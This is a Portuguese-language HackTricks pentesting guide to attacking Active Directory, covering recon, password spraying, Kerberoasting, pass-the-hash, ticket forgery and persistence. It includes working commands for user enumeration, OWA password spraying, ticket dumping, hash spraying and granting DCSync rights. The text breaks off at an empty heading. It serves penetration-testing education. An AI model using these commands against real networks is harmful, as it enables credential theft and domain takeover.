# Metodologia do Active Directory

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Visão geral básica

O Active Directory permite que administradores de rede criem e gerenciem domínios, usuários e objetos dentro de uma rede. Por exemplo, um administrador pode criar um grupo de usuários e conceder-lhes privilégios de acesso específicos a determinados diretórios no servidor. À medida que uma rede cresce, o Active Directory oferece uma maneira de organizar um grande número de usuários em grupos lógicos e subgrupos, enquanto fornece controle de acesso em cada nível.

A estrutura do Active Directory inclui três níveis principais: 1) domínios, 2) árvores e 3) florestas. Vários objetos (usuários ou dispositivos) que usam o mesmo banco de dados podem ser agrupados em um único domínio. Múltiplos domínios podem ser combinados em um único grupo chamado árvore. Múltiplas árvores podem ser agrupadas em uma coleção chamada floresta. Cada um desses níveis pode ser atribuído direitos de acesso específicos e privilégios de comunicação.

Conceitos principais de um Active Directory:

1. **Diretório** – Contém todas as informações sobre os objetos do Active Directory
2. **Objeto** – Um objeto refere-se a quase qualquer coisa dentro do diretório (um usuário, grupo, pasta compartilhada...)
3. **Domínio** – Os objetos do diretório estão contidos dentro do domínio. Dentro de uma "floresta", mais de um domínio pode existir e cada um terá sua própria coleção de objetos.
4. **Árvore** – Grupo de domínios com a mesma raiz. Exemplo: _dom.local, email.dom.local, www.dom.local_
5. **Floresta** – A floresta é o nível mais alto da hierarquia organizacional e é composta por um grupo de árvores. As árvores são conectadas por relações de confiança.

O Active Directory fornece vários serviços diferentes, que estão sob o guarda-chuva dos "Serviços de Domínio do Active Directory", ou AD DS. Estes serviços incluem:

1. **Serviços de Domínio** – armazena dados centralizados e gerencia a comunicação entre usuários e domínios; inclui autenticação de login e funcionalidade de busca
2. **Serviços de Certificado** – cria, distribui e gerencia certificados seguros
3. **Serviços de Diretório Leve** – suporta aplicações habilitadas para diretório usando o protocolo aberto (LDAP)
4. **Serviços de Federação de Diretórios** – fornece single-sign-on (SSO) para autenticar um usuário em múltiplas aplicações web em uma única sessão
5. **Gerenciamento de Direitos** – protege informações com direitos autorais impedindo o uso e distribuição não autorizados de conteúdo digital
6. **Serviço DNS** – Usado para resolver nomes de domínio.

AD DS está incluído no Windows Server (incluindo Windows Server 10) e é projetado para gerenciar sistemas clientes. Enquanto sistemas rodando a versão regular do Windows não têm os recursos administrativos do AD DS, eles suportam o Active Directory. Isso significa que qualquer computador Windows pode se conectar a um grupo de trabalho Windows, desde que o usuário tenha as credenciais de login corretas.\
**Fonte:** [**https://techterms.com/definition/active\_directory**](https://techterms.com/definition/active\_directory)

### **Autenticação Kerberos**

Para aprender a **atacar um AD**, você precisa **entender** muito bem o **processo de autenticação Kerberos**.\
[**Leia esta página se você ainda não sabe como funciona.**](kerberos-authentication.md)

## Cheat Sheet

Você pode dar uma olhada em [https://wadcoms.github.io/](https://wadcoms.github.io) para ter uma visão rápida de quais comandos você pode executar para enumerar/explorar um AD.

## Reconhecimento do Active Directory (Sem credenciais/sessões)

Se você apenas tem acesso a um ambiente AD, mas não tem nenhuma credencial/sessão, você poderia:

* **Testar a penetração na rede:**
* Escanear a rede, encontrar máquinas e portas abertas e tentar **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [impressoras podem ser alvos muito interessantes](ad-information-in-printers.md).
* Enumerar DNS pode dar informações sobre servidores-chave no domínio como web, impressoras, compartilhamentos, vpn, mídia, etc.
* `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
* Dê uma olhada na Metodologia de [**Teste de Penetração Geral**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar mais informações sobre como fazer isso.
* **Verificar acesso nulo e de convidado em serviços smb** (isso não funcionará em versões modernas do Windows):
* `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
* `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
* `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
* Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:

{% content-ref url="../../network-services-pentesting/pentesting-smb.md" %}
[pentesting-smb.md](../../network-services-pentesting/pentesting-smb.md)
{% endcontent-ref %}

* **Enumerar Ldap**
* `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
* Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

* **Envenenar a rede**
* Coletar credenciais [**impersonando serviços com Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
* Acessar host [**abusando do ataque de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
* Coletar credenciais **expondo** [**serviços UPnP falsos com evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
* [**OSINT**](https://book.hacktricks.xyz/external-recon-methodology):
* Extrair nomes de usuário/nomes de documentos internos, mídias sociais, serviços (principalmente web) dentro dos ambientes de domínio e também dos disponíveis publicamente.
* Se você encontrar os nomes completos dos trabalhadores da empresa, você poderia tentar diferentes convenções de nomes de usuário do AD (**[**leia isso**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NomeSobrenome_, _Nome.Sobrenome_, _NomSob_ (3 letras de cada), _Nom.Sob_, _NSobrenome_, _N.Sobrenome_, _SobrenomeNome_, _Sobrenome.Nome_, _SobrenomeN_, _Sobrenome.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
* Ferramentas:
* [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
* [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

* **Enumeração anônima SMB/LDAP:** Verifique as páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb.md) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
* **Enumeração com Kerbrute**: Quando um **nome de usuário inválido é solicitado**, o servidor responderá usando o código de erro **Kerberos** _KRB5KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN_, permitindo-nos determinar que o nome de usuário era inválido. **Nomes de usuários válidos** provocarão ou o **TGT em uma resposta AS-REP** ou o erro _KRB5KDC\_ERR\_PREAUTH\_REQUIRED_, indicando que o usuário é obrigado a realizar pré-autenticação.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
```
* **Servidor OWA (Outlook Web Access)**

Se você encontrou um desses servidores na rede, também pode realizar **enumeração de usuários contra ele**. Por exemplo, você poderia usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
{% hint style="warning" %}
Você pode encontrar listas de nomes de usuários neste [**repositório do github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) \*\*\*\* e neste outro ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).

No entanto, você deve ter o **nome das pessoas que trabalham na empresa** a partir da etapa de reconhecimento que você deve ter realizado antes. Com o nome e sobrenome, você poderia usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar possíveis nomes de usuários válidos.
{% endhint %}

### Conhecendo um ou vários nomes de usuários

Ok, então você sabe que já tem um nome de usuário válido, mas sem senhas... Então tente:

* [**ASREPRoast**](asreproast.md): Se um usuário **não tem** o atributo _DONT\_REQ\_PREAUTH_, você pode **solicitar uma mensagem AS\_REP** para esse usuário que conterá alguns dados criptografados por uma derivação da senha do usuário.
* [**Password Spraying**](password-spraying.md): Vamos tentar as senhas **mais comuns** com cada um dos usuários descobertos, talvez algum usuário esteja usando uma senha fraca (lembre-se da política de senhas!).
* Observe que você também pode **spray servidores OWA** para tentar obter acesso aos servidores de e-mail dos usuários.

{% content-ref url="password-spraying.md" %}
[password-spraying.md](password-spraying.md)
{% endcontent-ref %}

### Envenenamento LLMNR/NBT-NS

Você pode ser capaz de **obter** alguns **hashes de desafio** para quebrar **envenenando** alguns protocolos da **rede**:

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### Relay NTML

Se você conseguiu enumerar o active directory, você terá **mais e-mails e um melhor entendimento da rede**. Você pode ser capaz de forçar ataques de [**relay NTML**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) \*\*\*\* para obter acesso ao ambiente AD.

### Roubar Credenciais NTLM

Se você pode **acessar outros PCs ou compartilhamentos** com o **usuário nulo ou convidado**, você poderia **colocar arquivos** (como um arquivo SCF) que, se acessados de alguma forma, **dispararão uma autenticação NTML contra você** para que você possa **roubar** o **desafio NTLM** para quebrá-lo:

{% content-ref url="../ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

## Enumerando Active Directory COM credenciais/sessão

Para esta fase, você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tem algumas credenciais válidas ou um shell como um usuário de domínio, **você deve lembrar que as opções dadas antes ainda são opções para comprometer outros usuários**.

Antes de começar a enumeração autenticada, você deve saber o que é o **problema do duplo salto do Kerberos.**

{% content-ref url="kerberos-double-hop-problem.md" %}
[kerberos-double-hop-problem.md](kerberos-double-hop-problem.md)
{% endcontent-ref %}

### Enumeração

Ter comprometido uma conta é um **grande passo para começar a comprometer todo o domínio**, porque você vai poder iniciar a **Enumeração do Active Directory:**

Em relação ao [**ASREPRoast**](asreproast.md), agora você pode encontrar todos os usuários possivelmente vulneráveis, e em relação ao [**Password Spraying**](password-spraying.md), você pode obter uma **lista de todos os nomes de usuários** e tentar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

* Você poderia usar o [**CMD para realizar um reconhecimento básico**](../basic-cmd-for-pentesters.md#domain-info)
* Você também pode usar [**powershell para reconhecimento**](../basic-powershell-for-pentesters/), que será mais discreto
* Você também pode [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
* Outra ferramenta incrível para reconhecimento em um active directory é [**BloodHound**](bloodhound.md). Não é muito discreto (dependendo dos métodos de coleta que você usa), mas **se isso não importa** para você, definitivamente deve tentar. Descubra onde os usuários podem fazer RDP, encontrar caminhos para outros grupos, etc.
* **Outras ferramentas automatizadas de enumeração AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
* [**Registros DNS do AD**](ad-dns-records.md) pois podem conter informações interessantes.
* Uma **ferramenta com GUI** que você pode usar para enumerar o diretório é **AdExplorer.exe** da **SysInternal** Suite.
* Você também pode pesquisar no banco de dados LDAP com **ldapsearch** para procurar credenciais em campos _userPassword_ & _unixUserPassword_, ou até mesmo por _Description_. cf. [Senha no comentário do usuário AD em PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
* Se você estiver usando **Linux**, você também pode enumerar o domínio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
* Você também pode tentar ferramentas automatizadas como:
* [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
* [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
*   **Extraindo todos os usuários do domínio**

É muito fácil obter todos os nomes de usuários do domínio do Windows (`net user /domain`, `Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "usuário" -p "senha" <IP DC>`

> Mesmo que esta seção de Enumeração pareça pequena, esta é a parte mais importante de todas. Acesse os links (principalmente o de cmd, powershell, powerview e BloodHound), aprenda como enumerar um domínio e pratique até se sentir confortável. Durante uma avaliação, este será o momento chave para encontrar seu caminho para DA ou para decidir que nada pode ser feito.

### Kerberoast

O objetivo do Kerberoasting é colher **tickets TGS para serviços que funcionam em nome de contas de usuários de domínio**. Parte desses tickets TGS são **criptografados com chaves derivadas das senhas dos usuários**. Como consequência, suas credenciais podem ser **quebradas offline**.\
Mais sobre isso em:

{% content-ref url="kerberoast.md" %}
[kerberoast.md](kerberoast.md)
{% endcontent-ref %}

### Conexão Remota (RDP, SSH, FTP, Win-RM, etc)

Uma vez que você obteve algumas credenciais, você poderia verificar se tem acesso a qualquer **máquina**. Para isso, você poderia usar **CrackMapExec** para tentar conectar em vários servidores com diferentes protocolos, de acordo com suas varreduras de portas.

### Escalonamento de Privilégios Local

Se você comprometeu credenciais ou uma sessão como um usuário de domínio regular e você tem **acesso** com este usuário a **qualquer máquina no domínio**, você deve tentar encontrar uma maneira de **escalar privilégios localmente e procurar por credenciais**. Isso porque apenas com privilégios de administrador local você será capaz de **despejar hashes de outros usuários** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**escalamento de privilégios local no Windows**](../windows-local-privilege-escalation/) e uma [**lista de verificação**](../checklist-windows-privilege-escalation.md). Além disso, não se esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets da Sessão Atual

É muito **improvável** que você encontre **tickets** na sessão atual do usuário **concedendo permissão para acessar** recursos inesperados, mas você poderia verificar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTML Relay

Se você conseguiu enumerar o active directory, você terá **mais emails e um melhor entendimento da rede**. Você pode ser capaz de forçar ataques de [**relay NTML**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### **Procura por Creds em Compartilhamentos de Computadores**

Agora que você tem algumas credenciais básicas, você deve verificar se consegue **encontrar** quaisquer **arquivos interessantes sendo compartilhados dentro do AD**. Você poderia fazer isso manualmente, mas é uma tarefa muito tediosa e repetitiva (e mais ainda se você encontrar centenas de documentos que precisa verificar).

[**Siga este link para aprender sobre ferramentas que você poderia usar.**](../../network-services-pentesting/pentesting-smb.md#domain-shared-folders-search)

### Roubar Creds NTLM

Se você consegue **acessar outros PCs ou compartilhamentos**, você poderia **colocar arquivos** (como um arquivo SCF) que, se de alguma forma acessados, irão **disparar uma autenticação NTML contra você** para que você possa **roubar** o **desafio NTLM** para quebrá-lo:

{% content-ref url="../ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o controlador de domínio**.

{% content-ref url="printnightmare.md" %}
[printnightmare.md](printnightmare.md)
{% endcontent-ref %}

## Escalação de privilégios no Active Directory COM credenciais/sessão privilegiadas

**Para as seguintes técnicas, um usuário comum de domínio não é suficiente, você precisa de alguns privilégios/credenciais especiais para realizar esses ataques.**

### Extração de Hash

Esperançosamente, você conseguiu **comprometer alguma conta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilégios localmente](../windows-local-privilege-escalation/).\
Então, é hora de despejar todos os hashes na memória e localmente.\
[**Leia esta página sobre diferentes maneiras de obter os hashes.**](broken-reference/)

### Pass the Hash

**Uma vez que você tem o hash de um usuário**, você pode usá-lo para **se passar por ele**.\
Você precisa usar alguma **ferramenta** que irá **realizar** a **autenticação NTLM usando** esse **hash**, **ou** você poderia criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, então quando qualquer **autenticação NTLM for realizada**, esse **hash será usado.** A última opção é o que o mimikatz faz.\
[**Leia esta página para mais informações.**](../ntlm/#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque visa **usar o hash NTLM do usuário para solicitar tickets Kerberos**, como uma alternativa ao comum Pass the Hash sobre o protocolo NTLM. Portanto, isso pode ser especialmente **útil em redes onde o protocolo NTLM está desabilitado** e apenas **Kerberos é permitido** como protocolo de autenticação.

{% content-ref url="over-pass-the-hash-pass-the-key.md" %}
[over-pass-the-hash-pass-the-key.md](over-pass-the-hash-pass-the-key.md)
{% endcontent-ref %}

### Pass the Ticket

Este ataque é semelhante ao Pass the Key, mas em vez de usar hashes para solicitar um ticket, o **próprio ticket é roubado** e usado para autenticar como seu proprietário.

{% content-ref url="pass-the-ticket.md" %}
[pass-the-ticket.md](pass-the-ticket.md)
{% endcontent-ref %}

### Reutilização de Credenciais

Se você tem o **hash** ou **senha** de um **administrador local**, você deve tentar **fazer login localmente** em outros **PCs** com ele.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
{% hint style="warning" %}
Observe que isso é bastante **barulhento** e o **LAPS** ajudaria a **mitigar** isso.
{% endhint %}

### Abuso do MSSQL & Links Confiáveis

Se um usuário tem privilégios para **acessar instâncias do MSSQL**, ele poderia usá-las para **executar comandos** no host do MSSQL (se executado como SA), **roubar** o **hash** NetNTLM ou até realizar um **ataque** de **relay**.\
Além disso, se uma instância do MSSQL é confiável (link de banco de dados) por uma instância diferente do MSSQL. Se o usuário tem privilégios sobre o banco de dados confiável, ele poderá **usar a relação de confiança para executar consultas também na outra instância**. Essas confianças podem ser encadeadas e em algum momento o usuário pode ser capaz de encontrar um banco de dados mal configurado onde ele pode executar comandos.\
**Os links entre bancos de dados funcionam até mesmo através de confianças de floresta.**

{% content-ref url="abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](abusing-ad-mssql.md)
{% endcontent-ref %}

### Delegação Irrestrita

Se você encontrar qualquer objeto Computador com o atributo [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) e você tem privilégios de domínio no computador, você poderá extrair TGTs da memória de todos os usuários que fizerem login no computador.\
Então, se um **Administrador de Domínio fizer login no computador**, você poderá extrair seu TGT e se passar por ele usando [Pass the Ticket](pass-the-ticket.md).\
Graças à delegação restrita, você poderia até **comprometer automaticamente um Servidor de Impressão** (com sorte, será um DC).

{% content-ref url="unconstrained-delegation.md" %}
[unconstrained-delegation.md](unconstrained-delegation.md)
{% endcontent-ref %}

### Delegação Restrita

Se um usuário ou computador tem permissão para "Delegação Restrita", ele poderá **se passar por qualquer usuário para acessar alguns serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador, você poderá **se passar por qualquer usuário** (até administradores de domínio) para acessar alguns serviços.

{% content-ref url="constrained-delegation.md" %}
[constrained-delegation.md](constrained-delegation.md)
{% endcontent-ref %}

### Delegação Restrita Baseada em Recursos

É possível obter execução de código com **privilégios elevados em um computador remoto se você tiver privilégio de ESCRITA** no objeto AD desse computador.

{% content-ref url="resource-based-constrained-delegation.md" %}
[resource-based-constrained-delegation.md](resource-based-constrained-delegation.md)
{% endcontent-ref %}

### Abuso de ACLs

O usuário comprometido pode ter alguns **privilégios interessantes sobre alguns objetos do domínio** que poderiam permitir que você **mova** lateralmente/**escale** privilégios.

{% content-ref url="acl-persistence-abuse/" %}
[acl-persistence-abuse](acl-persistence-abuse/)
{% endcontent-ref %}

### Abuso do serviço de Spooler de Impressão

Se você encontrar qualquer **serviço de Spool ouvindo** dentro do domínio, você pode ser capaz de **abusar** dele para **obter novas credenciais** e **escalar privilégios**.\
[**Mais informações sobre como abusar dos serviços de Spooler aqui.**](printers-spooler-service-abuse.md)

### Abuso de sessões de terceiros

Se **outros usuários** **acessarem** a máquina **comprometida**, é possível **coletar credenciais da memória** e até **injetar beacons em seus processos** para se passar por eles.\
Geralmente, os usuários acessarão o sistema via RDP, então aqui está como realizar um par de ataques em sessões RDP de terceiros:

{% content-ref url="rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](rdp-sessions-abuse.md)
{% endcontent-ref %}

### LAPS

O **LAPS** permite que você **gerencie a senha do Administrador local** (que é **aleatória**, única e **alterada regularmente**) em computadores integrados ao domínio. Essas senhas são armazenadas centralmente no Active Directory e restritas a usuários autorizados usando ACLs. Se você tiver **permissão suficiente para ler essas senhas, você poderá mover para outros computadores**.

{% content-ref url="laps.md" %}
[laps.md](laps.md)
{% endcontent-ref %}

### Roubo de Certificado

Coletar certificados da máquina comprometida pode ser uma maneira de escalar privilégios dentro do ambiente:

{% content-ref url="ad-certificates/certificate-theft.md" %}
[certificate-theft.md](ad-certificates/certificate-theft.md)
{% endcontent-ref %}

### Abuso de Modelos de Certificado

Se modelos vulneráveis estiverem configurados, é possível abusar deles para escalar privilégios:

{% content-ref url="ad-certificates/domain-escalation.md" %}
[domain-escalation.md](ad-certificates/domain-escalation.md)
{% endcontent-ref %}

## Pós-exploração com conta de alto privilégio

### Despejo de Credenciais de Domínio

Uma vez que você obtém privilégios de **Administrador de Domínio** ou, melhor ainda, **Administrador de Empresa**, você pode **despejar** o **banco de dados do domínio**: _ntds.dit_.

[**Mais informações sobre o ataque DCSync podem ser encontradas aqui**](dcsync.md).

[**Mais informações sobre como roubar o NTDS.dit podem ser encontradas aqui**](broken-reference/)

### Privesc como Persistência

Algumas das técnicas discutidas anteriormente podem ser usadas para persistência.\
Por exemplo, você poderia:

*   Tornar usuários vulneráveis ao [**Kerberoast**](kerberoast.md)

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```
*   Tornar usuários vulneráveis ao [**ASREPRoast**](asreproast.md)

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
*   Conceder privilégios de [**DCSync**](./#dcsync) a um usuário

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O ataque Silver ticket é baseado em **criar um TGS válido para um serviço uma vez que o hash NTLM do serviço é possuído** (como o **hash da conta do PC**). Assim, é possível **ganhar acesso a esse serviço** forjando um TGS personalizado **como qualquer usuário** (como acesso privilegiado a um computador).

{% content-ref url="silver-ticket.md" %}
[silver-ticket.md](silver-ticket.md)
{% endcontent-ref %}

### Golden Ticket

Um **TGT válido como qualquer usuário** pode ser criado **usando o hash NTLM da conta krbtgt do AD**. A vantagem de forjar um TGT em vez de um TGS é poder **acessar qualquer serviço** (ou máquina) no domínio como o usuário se passando.

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### Diamond Ticket

Estes são como golden tickets forjados de uma maneira que **burla mecanismos comuns de detecção de golden tickets.**

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### **Persistência de Conta com Certificados**

**Ter certificados de uma conta ou ser capaz de solicitá-los** é uma maneira muito boa de persistir na conta do usuário (mesmo que ele mude a senha):

{% content-ref url="ad-certificates/account-persistence.md" %}
[account-persistence.md](ad-certificates/account-persistence.md)
{% endcontent-ref %}

### **Persistência de Domínio com Certificados**

**Usar certificados também é possível para persistir com altos privilégios dentro do domínio:**

{% content-ref url="ad-certificates/domain-persistence.md" %}
[domain-persistence.md](ad-certificates/domain-persistence.md)
{% endcontent-ref %}

### Grupo AdminSDHolder

A Lista de Controle de Acesso (ACL) do objeto **AdminSDHolder** é usada como um modelo para **copiar** **permissões** para **todos os “grupos protegidos”** no Active Directory e seus membros. Grupos protegidos incluem grupos privilegiados como Administradores de Domínio, Administradores, Administradores de Empresa e Administradores de Esquema, Operadores de Backup e krbtgt.\
Por padrão, a ACL deste grupo é copiada dentro de todos os "grupos protegidos". Isso é feito para evitar mudanças intencionais ou acidentais nesses grupos críticos. No entanto, se um atacante **modificar a ACL** do grupo **AdminSDHolder**, por exemplo, dando permissões completas a um usuário regular, esse usuário terá permissões completas em todos os grupos dentro do grupo protegido (em uma hora).\
E se alguém tentar excluir esse usuário dos Administradores de Domínio (por exemplo) em uma hora ou menos, o usuário estará de volta ao grupo.\
[**Mais informações sobre o Grupo AdminDSHolder aqui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciais DSRM

Existe uma conta de **administrador local** dentro de cada **DC**. Tendo privilégios de administração nesta máquina, você pode usar mimikatz para **despejar o hash do Administrador local**. Então, modificando um registro para **ativar essa senha** para que você possa acessar remotamente a esse usuário Administrador local.

{% content-ref url="dsrm-credentials.md" %}
[dsrm-credentials.md](dsrm-credentials.md)
{% endcontent-ref %}

### Persistência de ACL

Você poderia **conceder** alguns **privilégios especiais** a um **usuário** sobre alguns objetos específicos do domínio que permitirão ao usuário **escalar privilégios no futuro**.

{% content-ref url="acl-persistence-abuse/" %}
[acl-persistence-abuse](acl-persistence-abuse/)
{% endcontent-ref %}

### Descritores de Segurança

Os **descritores de segurança** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** outro **objeto**. Se você puder apenas **fazer** uma **pequena alteração** no **descritor de segurança** de um objeto, você pode obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.

{% content-ref url="security-descriptors.md" %}
[security-descriptors.md](security-descriptors.md)
{% endcontent-ref %}

### Skeleton Key

**Modificar o LSASS** na memória para criar uma **senha mestra** que funcionará para qualquer conta no domínio.

{% content-ref url="skeleton-key.md" %}
[skeleton-key.md](skeleton-key.md)
{% endcontent-ref %}

### SSP Personalizado

[Aprenda o que é um SSP (Provedor de Suporte de Segurança) aqui.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **texto claro** as **credenciais** usadas para acessar a máquina.\\

{% content-ref url="custom-ssp.md" %}
[custom-ssp.md](custom-ssp.md)
{% endcontent-ref %}

### DCShadow

Registra um **novo Controlador de Domínio** no AD e o usa para **empurrar atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar nenhum **registro** sobre as **modificações**. Você **precisa de privilégios de DA** e estar dentro do **domínio raiz**.\
Observe que se você usar dados errados, registros muito feios aparecerão.

{% content-ref url="dcshadow.md" %}
[dcshadow.md](dcshadow.md)
{% endcontent-ref %}

### Persistência LAPS

Anteriormente discutimos sobre como escalar privilégios se você tiver **permissão suficiente para ler as senhas do LAPS**. No entanto, essas senhas também podem ser usadas para **manter a persistência**.\
Confira:

{% content-ref url="laps.md" %}
[laps.md](laps.md)
{% endcontent-ref %}

## Escalada de Privilégios na Floresta - Confianças de Domínio

A Microsoft considera que o **domínio não é um Limite de Segurança**, a **Floresta é o Limite de Segurança**. Isso significa que **se você comprometer um domínio dentro de uma Floresta, você poderá ser capaz de comprometer toda a Floresta**.

### Informações Básicas

